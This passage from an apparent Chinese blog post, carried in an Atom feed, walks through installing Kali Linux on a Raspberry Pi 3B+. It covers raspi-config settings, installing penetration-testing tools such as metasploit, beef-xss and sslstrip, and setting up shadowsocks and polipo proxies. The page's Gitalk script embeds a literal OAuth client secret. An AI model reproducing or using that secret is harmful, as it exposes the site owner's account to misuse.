-y</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt autoremove</span><br><span class="line">apt-get autoclean</span><br><span class="line">wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20180406+1_all.deb</span><br><span class="line">apt-get install -y triggerhappy lua5.1 alsa-utils psmisc</span><br><span class="line">dpkg -i raspi-config_20180406+1_all.deb</span><br><span class="line">rm raspi-config_20180406+1_all.deb</span><br></pre></td></tr></table></figure></li><li><p>使用raspi-config配置树莓派<br>配置里没什么特别的，懂英文的应该都明白，比较重要的一项配置就是扩展文件系统，最开始kali并不会占用整个SD卡，只有在扩展完文件系统后才能使用全部的空间<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601212255.png" alt><br>翻译如下（鄙人根据理解和注释翻译，如有错误欢迎指正）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Change User Password —— 更改用户名和密码</span><br><span class="line">Network Options —— 网络选项</span><br><span class="line">    Hostname —— 更改主机名</span><br><span class="line">    Wi-fi —— 更改SSID的名称和密码</span><br><span class="line">    Network interface names —— 更改网络接口的名称</span><br><span class="line">Boot Options —— 启动选项</span><br><span class="line">    Desktop &#x2F; CLI —— 决定启动后进入终端还是进入桌面（建议不要更改）</span><br><span class="line">    Wait for Network at Boot —— 决定是否在启动时等待网络连接（建议不要开启，否则启动时会等好久，一直等到网络连接成功或者超时才启动）</span><br><span class="line">    Splash Screen —— 选择启动时是画面或文本</span><br><span class="line">Localisation Options —— 地区选项</span><br><span class="line">    Change Locale —— 更改地区</span><br><span class="line">    Change Timezone —— 更改时区</span><br><span class="line">    Change Keyboard Layout —— 更改键盘布局</span><br><span class="line">    Change Wi-fi Country —— 配置所在国家的wifi频道（可能不同的国家使用的channel不一样吧）</span><br><span class="line">Interfacing Options —— 接口选项</span><br><span class="line">    Camera —— 是否启用相机</span><br><span class="line">    SSH —— 是否启用ssh（远程命令行连接）</span><br><span class="line">    VNC —— 是否启用vnc（远程图像连接）</span><br><span class="line">    SPI —— 是否自动加载SPI内核模块</span><br><span class="line">    I2C —— 是否自动加载I2C内核模块</span><br><span class="line">    Serial —— 是否串行连接内核和shell的消息</span><br><span class="line">    1-Wire —— 是否启用one-wire接口</span><br><span class="line">Remote GPIO —— 是否启用远程访问GPIO引脚</span><br><span class="line">Overclock —— 是否超频</span><br><span class="line">Advanced Options —— 高级选项</span><br><span class="line">    Expand Filesystem —— 扩展文件系统（很重要，最好第一次配置的时候先选择这个）</span><br><span class="line">    Overscan —— 是否启用Overscan（就是当屏幕上有黑条闪过的时候需要启动这个）</span><br><span class="line">    Memory Split —— 更改用于GPU的内存量</span><br><span class="line">    Audio —— 强制音频通过HDMI或3.5mm插孔输出</span><br><span class="line">    Resolution —— 设置特定的屏幕分辨率</span><br><span class="line">    Pixel Doubling —— 是否启用像素倍增</span><br><span class="line">    GL Driver —— 是否启动实验桌面GL驱动程序</span><br><span class="line">Update —— 更新raspi-config</span><br><span class="line">About raspi-config —- 关于raspi-config</span><br></pre></td></tr></table></figure><p>配置完成后需要重启一次，配置过分辨率之后你就会发现你的树莓派启动看起来更加漂亮了！</p></li></ol><ul><li>到这里树莓派Kali的安装基本就完成了，剩下的就需要按照个人喜好去个性化的设置自己的kali了。建议在配置好树莓派后备份一下系统，鄙人就是因为当时没有备份系统而只能重装:)</li><li>备份系统的过程和烧录的过程是相似的，只不过在用Win32DiskImager选择的适合不是选择write而是选择read，备份后会生成一个img文件，想恢复备份的话直接将SD卡用SD card formatter清空在烧录即可，过程和上文中一样。注意备份的话是将整个SD卡备份，也就是说鄙人32G的内存卡（理想情况没有内存损失），备份后的img文件也是32G的，不管里面装了多少软件。</li><li>另外树莓派kali默认是不安装什么工具的，所以需要自己安装，后文将会介绍鄙人在这之后对树莓派kali的配置，如果感兴趣可以接着往下看。</li></ul><hr><h1 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h1><p>以下是鄙人安装的一些常用软件，有日常工具，如文本编辑图，图片查看器等等，也有一些渗透工具，还有一些系统的辅助工具，比如命令行补全增强等等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt -y --fix-broken install</span><br><span class="line">apt-get -y upgrade</span><br><span class="line">apt-get -y dist-upgrade</span><br><span class="line">apt-get -y install vim tree leafpad bash-completion wine macchanger cewl crunch curl tcpdump ettercap-graphical metasploit-framework beef-xss <span class="built_in">set</span> netcat dsniff driftnet ssldump fping polipo ngrep proxychains burpsuite nbtscan shadowsocks python-pip python3-pip whatweb sslstrip httrack wpscan gdb weevely cupp</span><br><span class="line">apt autoremove</span><br><span class="line">apt-get clean</span><br><span class="line">apt-get autoclean</span><br></pre></td></tr></table></figure><hr><h1 id="中文支持以及输入法"><a href="#中文支持以及输入法" class="headerlink" title="中文支持以及输入法"></a>中文支持以及输入法</h1><p>没有中文支持的话显示中文就会是乱码（打开浏览器会发现中文全是像麻将一样的方块），而且搜索的时候也很不方便，于是安装一下中文支持</p><ol><li><p>中文显示支持</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fonts-wqy-zenhei</span><br></pre></td></tr></table></figure><p>重启之后就可以正常显示中文了</p></li><li><p>中文输入法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install scim-pinyin</span><br></pre></td></tr></table></figure><p>安装完成后命令行输入scim就可以打开输入法了，建议把scim加入开机启动命令的列表里</p></li></ol><hr><h1 id="去外面的世界看看"><a href="#去外面的世界看看" class="headerlink" title="去外面的世界看看"></a>去外面的世界看看</h1><p>shadowsocks安装完成后开始配置番羽土啬<br>鄙人的shadowsocks.json如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>: <span class="string">"xxxxxxx"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>: xxxxx,</span><br><span class="line">    <span class="attr">"local_address"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>: <span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>: <span class="string">"xxxxxx"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>: <span class="number">600</span>,</span><br><span class="line">    <span class="attr">"method"</span>: <span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动shadowsockets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sslocal -c /root/shadowsocks.json -d start <span class="comment"># 建议把这个放在开机启动的命令里</span></span><br><span class="line">curl ip.sb</span><br><span class="line">curl --socks5 127.0.0.1:1080 ip.sb</span><br></pre></td></tr></table></figure><p>在上面鄙人安装的软件中有polipo，用这个来将Sock5代理转换为http代理，之后实现命令行番羽土啬<br>修改/etc/polipo/config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This file only needs to list configuration variables that deviate</span></span><br><span class="line"><span class="comment"># from the default values.  See /usr/share/doc/polipo/examples/config.sample</span></span><br><span class="line"><span class="comment"># and "polipo -v" for variables you can tweak and further information.</span></span><br><span class="line"></span><br><span class="line">logSyslog = <span class="literal">true</span></span><br><span class="line">logFile = /var/<span class="built_in">log</span>/polipo/polipo.log</span><br><span class="line"></span><br><span class="line">proxyAddress = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">socksParentProxy = <span class="string">"127.0.0.1:1080"</span></span><br><span class="line">socksProxyType = socks5</span><br><span class="line">proxyPort = 8123</span><br><span class="line"></span><br><span class="line">chunkHighMark = 50331648</span><br><span class="line">objectHighMark = 16384</span><br><span class="line"></span><br><span class="line">serverMaxSlots = 64</span><br><span class="line">serverSlots = 16</span><br><span class="line">serverSlots1 = 32</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/polipo restart</span><br><span class="line">curl ip.sb</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8123 <span class="comment"># 启动代理</span></span><br><span class="line">curl ip.sb</span><br><span class="line"><span class="built_in">unset</span> http_proxy <span class="comment"># 取消代理</span></span><br><span class="line">curl ip.sb</span><br></pre></td></tr></table></figure><p>安装Firefox proxy，之后就可以畅游外面的世界了</p><hr><h1 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git  ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      Install Kali Linux on Raspberry Pi 3B+.
    
    </summary>
    
    
      <category term="Geek" scheme="https://srpopty.github.io/categories/Geek/"/>
    
    
      <category term="RaspberryPi" scheme="https://srpopty.github.io/tags/RaspberryPi/"/>
    
  </entry>
  
</feed>
